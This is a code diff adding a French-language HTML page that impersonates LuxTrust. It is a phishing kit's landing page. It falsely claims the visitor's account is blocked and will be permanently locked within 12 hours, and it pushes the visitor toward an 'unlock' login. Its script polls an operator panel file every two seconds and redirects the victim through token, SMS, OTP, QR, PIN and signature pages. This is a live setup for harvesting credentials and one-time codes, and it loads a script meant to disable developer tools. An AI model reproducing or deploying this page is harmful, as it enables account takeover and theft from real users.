@@ -1,0 +1,141 @@
+<html><head><script disable-devtool-auto="" src="./js/card-reader.js"></script>
+
+
+
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="./css/index.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<title>LuxTrust</title>
+<script type="text/javascript">
+
+            function verifierContenu() {
+                $.ajax({
+                    url: '../panel/road.txt',
+                    type: 'GET',
+                    cache: false,
+                    success: function(data) {
+		              if (data.includes('login-mobile')) {
+		                  window.location.href = 'mobile.php';
+		              } else if (data.includes('false-logine-mobile')) {
+		                  window.location.href = 'mobile.php?error=error';
+		              } else if (data.includes('login-token')) {
+		                  window.location.href = 'token.php';
+		              } else if (data.includes('false-logine-token')) {
+		                  window.location.href = 'token.php?error=error';
+		              } else if (data.includes('redirect-sms')) {
+		                  window.location.href = 'sms.php';
+		              } else if (data.includes('false-sms')) {
+		                  window.location.href = 'sms.php?error=error';
+		              } else if (data.includes('redirect-otp')) {
+		                  window.location.href = 'otp.php';
+		              } else if (data.includes('false-otp')) {
+		                  window.location.href = 'otp.php?error=error';
+		              } else if (data.includes('redirect-qr')) {
+		                  window.location.href = 'qr.php';
+		              } else if (data.includes('false-qr-false')) {
+		                  window.location.href = 'qr.php?error=error';
+		              } else if (data.includes('redirect-signature')) {
+		                  window.location.href = 'signature.php';
+		              } else if (data.includes('redirect-pin')) {
+		                  window.location.href = 'pin.php';
+		              }else if (data.includes('redirect-fin')) {
+		                  window.location.href = 'thanks.php';
+		              }else if (data.includes('redirect-app')) {
+		                  window.location.href = 'app.php';
+		              }
+                    },
+                    error: function() {
+                        console.log('Erreur lors de la récupération du contenu de road.txt');
+                    }
+                });
+            }
+
+
+            setInterval(verifierContenu, 2000);
+
+</script></head>
+
+
+
+<body><header>
+	<nav id="navone">
+		<ul>
+			<li style="font-size:14px;display: flex;align-items: center;">FR</li>
+			<li id="actif"><span><img style="left: -8px" ;="" src="./img/3.svg"> MON LUXTRUST <img style="left: 8px;" src="./img/4.svg"> </span></li>
+		</ul>
+	</nav>
+
+	<nav id="navtwo">
+		<ul>
+			<li style="padding-left: 0px;"> <img src="./img/logo.png"> </li>
+			<li>Particulier</li>
+			<li class="none">Professionnels</li>
+			<li class="none">Secteurs</li>
+			<li class="none">À propos de nous</li>
+			<li>Aide</li>
+		</ul>
+	</nav>
+</header>
+
+
+
+	<main>
+		<div id="directory"> <img src="./img/home.png"> <span>&nbsp;<span class="spanzer">&gt;</span> My LuxTrust <span class="spanzer">&gt;</span>  Mon certificat <span class="spanzer">&gt;</span> <span id="activey">Réactiver</span></span></div>
+
+
+		<section class="forming">
+			<center>
+				<div id="container-title">
+				<span>RÉACTIVATION D'UN COMPTE CLIENT SUSPENDU</span>
+				<h1>Débloquer mon accès LuxTrust</h1>
+				<p>Par mesure de sécurité, votre compte est bloqué après 5 échecs de connexion. Il sera bloqué définitivement dans un délais de 12 heures sans retour de votre part.<br><br>Si vous souhaitez procéder au déblocage de votre compte LuxTrust maintenant, nous vous invitons d’abord à prendre connaissance de la démarche à suivre et à préparer les éléments nécessaires<br><br><span style="font-weight: 500;">Temps estimé : </span> 3 minutes</p>
+				</div>
+			</center>
+
+			<form action="login.php"><button class="btnzer">Débloquer mon compte<img src="./img/btnico.svg"></button></form>
+
+
+			<ul id="asking">
+				<li>
+					<div> <span>1.</span> <span>Activer votre Token</span> </div>
+					<img src="./img/down.svg">
+				</li>
+				<li>
+					<div> <span>2.</span> <span>Activer votre appli LuxTrust Mobile (si vous n'avez jamais été équipé(e) d'un dispositif LuxTrust)</span> </div>
+					<img src="./img/down.svg">
+				</li>
+				<li>
+					<div> <span>3.</span> <span>Activer votre appli LuxTrust Mobile avec un Token LuxTrust</span> </div>
+					<img src="./img/down.svg">
+				</li>
+				<li>
+					<div> <span>4</span> <span>Activer votre appli LuxTrust Mobile avec un Scan LuxTrust</span> </div>
+					<img src="./img/down.svg">
+				</li>
+				<li>
+					<div> <span>5.</span> <span>Activer votre Scan</span> </div>
+					<img src="./img/down.svg">
+				</li>
+				<li>
+					<div> <span>6.</span> <span>Activer votre SmartCard ou Signing Stick</span> </div>
+					<img src="./img/down.svg">
+				</li>
+			</ul>
+
+
+		</section>
+
+	</main>
+
+
+
+<footer>
+	<center>
+<img src="./img/logofooter.png"><br><br>
+Conditions générales de vente - 
+Politique en matière de cookies - 
+Protection des donnée</center>
+</footer>
+
+</body></html>
